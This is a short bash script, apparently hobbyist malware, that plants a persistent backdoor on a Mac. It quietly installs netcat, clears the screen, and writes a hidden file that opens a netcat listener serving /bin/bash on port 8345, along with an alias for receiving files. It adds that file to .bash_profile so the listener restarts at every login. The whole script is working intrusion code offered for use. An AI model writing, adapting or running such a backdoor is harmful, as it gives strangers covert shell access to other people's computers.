# Open a reverse shell on target computer.
# You will need to have their IP to connect.
# @author Hogchops

# Change to home directory
cd ~

file1=.axkda
file2=.bash_profile

# Install netcat if not present
brew list netcat || brew install netcat &
clear

# If a bash profile does not exist, create one
if [ ! -f $file2 ]
then
		touch $file2
fi

# If the backdoor file is not there, create one
if [ ! -f $file1 ]
then
		touch $file1
		echo "nc -l -p 8345 -e /bin/bash &">>$file1
		echo 'alias xoutfile="nc -l -p 6996 > $@"'>>$file1
		echo " . $file1">>$file2
fi

# Implement the change
source $file2
